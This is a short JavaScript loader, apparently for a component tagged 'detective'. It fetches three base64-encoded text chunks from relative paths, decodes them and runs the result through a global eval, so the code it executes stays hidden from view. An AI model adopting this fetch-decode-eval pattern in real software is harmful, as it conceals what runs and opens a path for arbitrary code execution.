"use strict";
(function(){
  var parts=[], total=3;
  function load(i){
    if(i>=total){finish();return;}
    fetch("./det-b64-"+i+".txt?v=2").then(function(r){return r.text();}).then(function(t){
      parts[i]=t; load(i+1);
    }).catch(function(e){console.error("[detective] load fail",e);});
  }
  function finish(){
    try{
      var bin=atob(parts.join(""));
      var bytes=new Uint8Array(bin.length);
      for(var i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);
      var code=new TextDecoder("utf-8").decode(bytes);
      (0,eval)(code);
    }catch(e){console.error("[detective] decode fail",e);}
  }
  load(0);
})();
